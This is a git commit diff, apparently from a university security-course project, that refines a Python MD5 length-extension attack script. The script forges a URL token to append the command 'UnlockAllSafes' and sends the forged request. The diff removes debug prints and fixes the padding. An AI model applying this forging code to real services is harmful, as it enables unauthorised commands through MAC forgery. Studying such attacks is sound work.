e56a365652fdd7d5ee8e547d77f7ac962b85d9d5
ryanmars <ryanmars@umich.edu>
2018-01-17 14:28:41 -0500

    PART 1 FINISHED

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -1,4 +1,4 @@
-from  pymd5 import md5, padding
+from pymd5 import md5, padding
 import httplib, urlparse, urllib, sys
 
 url = sys.argv[1]
@@ -10,25 +10,16 @@ url1 = url[:idx1+6]
 token = url[idx1+6:idx2-1]
 url2 = url[idx2:len(url)]
 
-print "URL=", url
-print "\nURL1=", url1
-print "TOKEN=", token
-print "URL2=", url2
-
 x = "&command3=UnlockAllSafes"
 
 l_of_m = 8 + len(url2)
 bits = (l_of_m + len(padding(l_of_m*8)))*8
 
-h = md5(state=(token.decode("hex")), count=bits)
-
-h.update(urllib.quote(padding((l_of_m + len(x)) * 8) + x))
-
+h = md5(state=token.decode("hex"), count=bits)
+h.update(x)
 new_token = h.hexdigest()
 
-new_url = url1 + new_token + "&" + url2 + urllib.quote(padding((l_of_m + len(x)) * 8)) + x
-
-print "\nNEW=", new_url
+new_url = url1 + new_token + "&" + url2 + urllib.quote(padding(l_of_m * 8)) + x
 
 parsedUrl = urlparse.urlparse(new_url)
 conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
